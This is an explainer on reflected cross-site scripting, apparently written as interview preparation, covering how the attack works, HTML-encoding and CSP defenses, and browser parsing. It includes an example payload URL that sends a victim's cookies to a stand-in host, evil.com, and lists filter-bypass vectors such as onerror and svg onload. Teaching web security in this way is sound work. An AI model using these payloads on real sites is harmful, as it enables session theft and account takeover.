What is Reflected XSS?

Reflected XSS occurs when user-supplied input from the URL (query params, path, fragment) is reflected back into the HTML response without proper encoding. The payload is NOT stored — it only executes when the victim clicks a malicious link.

1. Attacker crafts URL → 2. Victim clicks link → 3. Server reflects input → 4. Browser executes script → 5. Cookie/data stolen

Attack Example

// Malicious URL crafted by attacker:
https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>

// Server response (vulnerable — no encoding):
<p>You searched for: <script>document.location='https://evil.com/steal?c='+document.cookie</script></p>

// Server response (secure — HTML encoded):
<p>You searched for: &lt;script&gt;...&lt;/script&gt;</p>

Defense: Output Encoding

// The fix is simple: HTML-encode ALL user input before reflecting
function htmlEncode(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// In Express:
res.send(`You searched for: ${htmlEncode(req.query.q)}`);

🔬 How the Browser Processes Reflected XSS

1. Network Layer: Browser sends GET /search?q=PAYLOAD. Server responds with Content-Type: text/html containing the reflected input.

2. HTML Parser (Tokenizer): The HTML parser tokenizes the response. When it encounters <script>, it switches to "script data" state and passes content to the JS engine. For <img onerror=...>, the parser creates an IMG element and queues the error handler.

3. DOM Tree Construction: Parsed tokens become DOM nodes. Script elements are executed during tree construction (synchronous). Event handlers (onerror, onload) are queued in the microtask queue.

4. V8 Execution: When script code runs, it has full access to the document context — cookies (unless HttpOnly), localStorage, DOM, and can make fetch() calls to attacker-controlled servers.

5. Cookie Access: document.cookie returns all non-HttpOnly cookies for the current origin. This is why auth tokens must be in HttpOnly cookies.

Why HTML Encoding Works

// When the server encodes < as &lt; the HTML parser sees:
//   Token: TEXT "<script>alert(1)</script>"
// Instead of:
//   Token: START_TAG "script"
//   Token: TEXT "alert(1)"
//   Token: END_TAG "script"
//
// The parser never enters "script data" state → no JS execution.
// The encoded text is displayed as literal characters on screen.

Google Senior Frontend — Reflected XSS Questions

Q: What's the difference between reflected and stored XSS?

Reflected XSS is transient — the payload is in the URL and only executes when the victim clicks the link. Stored XSS persists in the database and attacks every visitor. Stored is more dangerous because it's persistent and doesn't require social engineering.

Q: Can CORS prevent reflected XSS?

No. CORS only applies to cross-origin fetch/XHR requests. Reflected XSS happens on the SAME origin — the victim visits the legitimate site with the malicious query parameter. The response is first-party, so no CORS check applies.

Q: Why not just use a regex to strip <script> tags?

Regex-based filtering is brittle. Attackers bypass with: <sCrIpT> (case variations), <scr<script>ipt> (recursive injection), <img onerror=...> (no script tag needed), <svg/onload=...> (SVG vectors). Output encoding is comprehensive because it addresses the root cause: unescaped output context.

Q: How would you prevent reflected XSS at Google scale?

Defense in depth: (1) Output encoding in templates (auto-escaping in Angular/React), (2) CSP with nonces to block inline scripts even if encoding is missed, (3) Trusted Types to prevent DOM XSS, (4) HttpOnly cookies to limit impact, (5) WAF rules at the load balancer for known patterns. At Google, templates use auto-escaping by default (go/safehtml), and CSP is enforced across all properties.
